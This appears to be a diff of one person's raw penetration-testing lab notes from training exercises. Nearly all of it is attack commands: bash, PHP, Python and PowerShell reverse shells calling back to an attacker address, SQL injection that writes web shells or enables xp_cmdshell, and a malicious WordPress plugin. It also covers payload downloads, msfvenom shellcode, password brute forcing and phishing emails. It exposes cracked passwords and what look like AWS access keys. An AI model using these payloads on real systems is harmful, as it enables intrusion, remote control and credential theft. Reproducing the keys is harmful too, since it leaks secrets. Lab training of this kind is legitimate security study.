+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 4 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hulabaloo        (?)     
+1g 0:00:00:12 DONE (2025-07-06 20:24) 0.07867g/s 39804p/s 39804c/s 39804C/s hunny22..howie13
+Use the "--show --format=phpass" options to display all of the cracked passwords reliably
+Session completed
+
+curl 'http://alvida-eatery.org/wp-content/plugins/srwebshell/srwebshell.php?cmd=bash%20-c%20"bash%20-i%20>%26%20%2Fdev%2Ftcp%2F192.168.45.194%2F4749%200>%261"'
+
+nc -lvnp 4749
+curl "http://alvida-eatery.org/wp-content/plugins/srwebshell/srwebshell.php?cmd=php%20-r%20'\$sock=fsockopen(\"192.168.45.194\",4749);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+curl "http://alvida-eatery.org/wp-content/plugins/srwebshell/srwebshell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.194%22%2C4749%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27"
+
+curl "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users"
+
+<?php
+/*
+Plugin Name: Reverse Shell
+Plugin URI: http://example.com
+Description: Just a simple plugin :)
+Version: 1.0
+Author: You
+*/
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.194/443 0>&1'");
+?>
+zip -r plug.zip index.php
+
+http://alvida-eatery.org/wp-login.php
+admin    hulabaloo
+upload plugin from abvoe
+
+nc -lvnp
+click activate plugin in browser
+
+
+
+
+192.168.102.48
+sudo nmap -sV 192.168.102.48 --top-ports 1000
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp   open  http    nginx 1.14.2
+3306/tcp open  mysql   MySQL (unauthorized)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+WORKED
+curl -X POST http://192.168.102.48/ \
+-H "Content-Type: application/x-www-form-urlencoded" \
+--data-urlencode "mail-list=' UNION ALL SELECT NULL,NULL,NULL,NULL,'<?php system(\$_GET[\"cmd\"]); ?>',NULL INTO OUTFILE '/var/www/html/rce.php' -- "
+
+nc -lvnp 4444
+
+curl "http://192.168.102.48/rce.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.194%2F4444%200%3E%261'"
+
+got shell
+find / -type f -iname "flag.txt" 2>/dev/null
+
+
+192.168.102.49
+sudo nmap -sV 192.168.102.49 --top-ports 1000
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+80/tcp   open  http       Apache httpd 2.4.54 ((Debian))
+5432/tcp open  postgresql PostgreSQL DB 13.5 - 13.9
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+IN BURP SEND THIS
+height=1'; COPY (SELECT '') TO PROGRAM 'bash+-c+"bash+-i+>%26+/dev/tcp/192.168.45.194/1234+0>%261"';-- -
+
+curl -X POST http://192.168.102.49/path \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode "height=1'; COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/192.168.45.194/1234 0>&1\"';-- -"
+
+
+
+192.168.102.50
+sudo nmap -sV 192.168.102.50 --top-ports 1000
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+
+nc -lvnp 443
+
+';EXEC sp_configure 'show advanced options', 1;--
+';RECONFIGURE;--
+';EXEC sp_configure "xp_cmdshell", 1;--
+';RECONFIGURE;--
+
+
+'%3BEXEC%20sp_configure%20%27show%20advanced%20options%27%2C%201%3B--
+
+'%3BRECONFIGURE%3B--
+
+'%3BEXEC%20sp_configure%20%22xp_cmdshell%22%2C%201%3B-- 
+
+'%3BRECONFIGURE%3B-- 
+
+'%3bEXEC+xp_cmdshell+"certutil+-urlcache+-f+http://192.168.45.194/nc64.exe+c:/windows/temp/nc.exe"%3b--
+
+'%3bEXEC+xp_cmdshell+"c:/windows/temp/nc.exe+192.168.45.194+443+-e+cmd.exe"%3b--
+
+Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include flag.txt
+
+type flag.txt
+
+
+
+192.168.102.16
+port 80 XSS admin / password
+http://192.168.102.16/wp-login.php
+//etc/hosts
+192.168.102.16 offsecwp
+login
+
+<?php
+/*
+Plugin Name: Reverse Shell
+Plugin URI: http://example.com
+Description: Just a simple plugin :)
+Version: 1.0
+Author: You
+*/
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.194/443 0>&1'");
+?>
+zip -r plug.zip index.php
+
+nc -lvnp 443
+plugins add new
+activate
+
+find / -type f -iname "flag" 2>/dev/null
+
+
+192.168.102.195  VM #2 OS Credentials:
+192.168.102.194  VM #1 OS Credentials:
+offsec / lab
+// better .lnk command
+powershell.exe -nop -w hidden -c "IEX((New-Object Net.WebClient).DownloadString('http://192.168.45.194:8000/powercat.ps1')); Start-Sleep -s 1; powercat -c 192.168.45.194 -p 4444 -e powershell"
+
+192.168.102.199  VM #4 OS Credentials:
+192.168.102.194  VM #3 OS Credentials:
+offsec / lab
+test / password
+email user: test@supermagicorg.com
+pass: test
+
+swaks -t dave.wizard@supermagicorg.com \
+  --from test@supermagicorg.com \
+  --server 192.168.194.199 \
+  --attach config.Library-ms \
+  --body body.txt \
+  --header "Subject: Problems" \
+  --suppress-data 
+
+sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach @config.Library-ms --server 192.168.102.199 --body @body.txt --header "Subject: Problems" --suppress-data
+
+sudo nmap -sV 192.168.102.199 --top-ports 1000
+PORT     STATE SERVICE       VERSION
+25/tcp   open  smtp          hMailServer smtpd
+80/tcp   open  http          Microsoft IIS httpd 10.0
+110/tcp  open  pop3          hMailServer pop3d
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+143/tcp  open  imap          hMailServer imapd
+445/tcp  open  microsoft-ds?
+587/tcp  open  smtp          hMailServer smtpd
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+Service Info: Host: ADMIN; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+
+192.168.102.10
+sudo nmap -sV 192.168.102.10 --top-ports 1000
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+Service Info: Host: REMOTEMOUSE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+port 443
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.194 LPORT=443 -f exe > reverse_50972.exe
+
+python3 50972.py 192.168.102.10 192.168.45.194 reverse_50972.exe
+
+python3 -c "open('50972_2.py', 'w', encoding='utf-8').write(open('50972.py', encoding='utf-8').read().replace('\u200b', ''))"
+
+
+python2 49601.py 192.168.102.10 192.168.45.194 reverse_50972.exe
+
+mkae sure python http serving the exe
+
+
+
+python3 50512.py 192.168.102.188
+
+nc -lvnp 4444
+
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.45.194",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+
+
+flag /home/challenge/
+192.168.102.52
+PublicExploits03 SSH on Port 32826:
+student / lab
+
+sudo nmap -sS -sV -O -A -Pn 192.168.102.52
+sudo nmap -sV 192.168.102.52 -p-
+
+James port to 32822 and SMTP to 32825 in exploit.
+python3 50347.py 192.168.102.52 192.168.45.194 443
+
+
+192.168.102.52  VM #1 OS Credentials:
+Fixing Exploits - Fixing Web Exploits - Module Exercise VM #1 HTTP on Port 80:
+/ 
+
+sudo nmap -sV 192.168.102.52 --top-ports 1000
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+http://192.168.102.52/cmsms/admin
+offsec
+lFEZK1vMpzeyZ71e8kRRqXrFAs9X16iJ
+
+44976.py
+
+curl -k http://192.168.102.52/cmsms/uploads/shell.php?cmd=whoami
+
+curl -k http://192.168.102.52/cmsms/uploads/shell.php?cmd=cat%20%2Fhome%2Fflag.txt
+
+
+192.168.102.46
+sudo nmap -sV 192.168.102.46 --top-ports 1000
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
+80/tcp   open  http          Apache httpd 2.4.25 ((Debian))
+3389/tcp open  ms-wbt-server Microsoft Terminal Service
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub
+20000/tcp open  dnp
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+
+
+cp /var/lib/inetsim/http/fakefiles/sample.jpg SecSignal.jpg
+python2 46481.py http://192.168.102.46/seclab
+
+shell
+
+
+192.168.102.213
+windows/remote/42155.py
+searchsploit -m windows/remote/42155.py
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.194 LPORT=4444 -f python -b '\x00'
+- or -
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.199 LPORT=80 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -v shellcode
+
+replace shellcode variable
+nc -lvnp 4444
+python2 42155.py 192.168.102.213
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.194 LPORT=1990 -f python -b "\x00\x20" -v shellcode
+
+msfconsole
+
+use exploit/multi/handler
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.45.194
+set LPORT 1990
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j
+
+
+python2 50999.py 192.168.102.213 20000
+
+
+AWS
+dns ip: 44.205.248.174
+kali ip: 44.201.58.219
+kali pass: Ks8IaSyQLKNqRZq1
+access key id: AKIAWIQVKDEGELC6CBKB
+secret access key: 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
+
+sudo nmcli connection modify "Wired connection 1" ipv4.dns "44.205.248.174"
+sudo systemctl restart NetworkManager
+cat /etc/resolv.conf
+nslookup git.offseclab.io
+    Server:         44.205.248.174
+    Address:        44.205.248.174#53
+
+    Non-authoritative answer:
+    Name:   git.offseclab.io
+    Address: 44.203.135.216
+
+
+sudo msfdb init
+
+msfconsole --quiet
+use auxiliary/scanner/http/jenkins_enum
+show options
+set RHOSTS automation.offseclab.io
+set TARGETURI /
+run
+
+feroxbuster -u http://automation.offseclab.io/ - w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://automation.offseclab.io/ -w /usr/share/wordlists/dirb/common.txt -b 403
+
+/assets               (Status: 302) [Size: 0] [--> http://automation.offseclab.io/assets/]
+/error                (Status: 400) [Size: 9503]
+/favicon.ico          (Status: 200) [Size: 17542]
+/git                  (Status: 302) [Size: 0] [--> http://automation.offseclab.io/git/]
+/help_answer          (Status: 200) [Size: 44]                                                       THIS ONE
+/login                (Status: 200) [Size: 1570]
+/logout               (Status: 302) [Size: 0] [--> http://automation.offseclab.io/]
+/META-INF             (Status: 404) [Size: 449]
+/meta-inf             (Status: 404) [Size: 449]
+/robots.txt           (Status: 200) [Size: 71]
+/signup               (Status: 404) [Size: 6774]
+/WEB-INF              (Status: 404) [Size: 448]
+/web-inf              (Status: 404) [Size: 448]
+
+
+
+
+Brute force the users discovered in the SCM server and find the user with a weak password. What is that user's password?
+The fuzzing endpoint should be http://git.offseclab.io/api/v1/user.
+Try brute forcing Billy with any web application brute force tool.
+these are all the users Billy, Jack, Lucy, Roger, and administrator (but based on the hint it is billy)
+
+ffuf -w /usr/share/wordlists/rockyou.txt \
+     -X POST \
+     -d "username=billy&password=FUZZ" \
+     -u http://git.offseclab.io/api/v1/user \
+     -mc all \
+     -fc 401,403,404 \
+     -t 50 \
+     -H "Content-Type: application/x-www-form-urlencoded"
+
+wfuzz -z file,/usr/share/wordlists/seclists/Passwords/2020-200_most_used_passwords.txt --basic "Billy:FUZZ" http://git.offseclab.io/api/v1/user
+
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2020-200_most_used_passwords.txt
+
+
+wfuzz worked, Billy : qwerty
+
+
+
+
+dirb http://app.offseclab.io
+
+curl https://staticcontent-3m3bwogxkg6xz8nq.s3.us-east-1.amazonaws.com
+
+https://staticcontent-3m3bwogxkg6xz8nq.s3.us-east-1.amazonaws.com/images/bunny.jpg
+
+aws configure
+
+aws s3 ls staticcontent-3m3bwogxkg6xz8nq
+                           PRE .git/
+                           PRE images/
+                           PRE scripts/
+                           PRE webroot/
+2025-07-08 00:39:17        972 CONTRIBUTING.md
+2025-07-08 00:39:16         79 Caddyfile
+2025-07-08 00:39:16        407 Jenkinsfile
+2025-07-08 00:39:17        879 README.md
+2025-07-08 00:39:17        176 docker-compose.yml
+
+aws s3 ls s3://staticcontent-3m3bwogxkg6xz8nq/webroot/
+aws s3 cp s3://staticcontent-3m3bwogxkg6xz8nq/webroot/index.html .
+
+//downloads the index.html 
+
+
+aws s3 cp s3://staticcontent-3m3bwogxkg6xz8nq/README.md ./
+
+mkdir static_content
+
+aws s3 sync s3://staticcontent-3m3bwogxkg6xz8nq ./static_content/
+
+
+FIX APT INSTALL
+curl -fsSL https://archive.kali.org/archive-key.asc | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/kali-archive-keyring.gpg
+sudo apt update
+sudo apt --fix-broken install
+sudo dpkg --configure -a
+
+
+git log
+git show a2028c4dca191ece9654959a25e21743baf98e68
+echo "YWRtaW5pc3RyYXRvcjpnd2w1d2U1bTc0dXU3YWFt" | base64 --decode
+administrator:gwl5we5m74uu7aam
+
+// find flag in history
+git grep -I -i "OS{" $(git rev-list --all)
+
+git.offseclab.io
+
+login above
+
+edit jenkinsfile in image-transform
+
+pipeline {
+  agent any
+  stages {
+    stage('Build') {
+      steps {
+        withAWS(region: 'us-east-1', credentials: 'aws_key') {
+          script {
+            if (isUnix()) {
+              sh 'curl http://44.201.58.219/unix'
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+AWS
+dns ip: 44.205.248.174
+kali ip: 44.201.58.219
+kali pass: Ks8IaSyQLKNqRZq1
+access key id: AKIAWIQVKDEGELC6CBKB
+secret access key: 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
+
+ssh kali@44.201.58.219
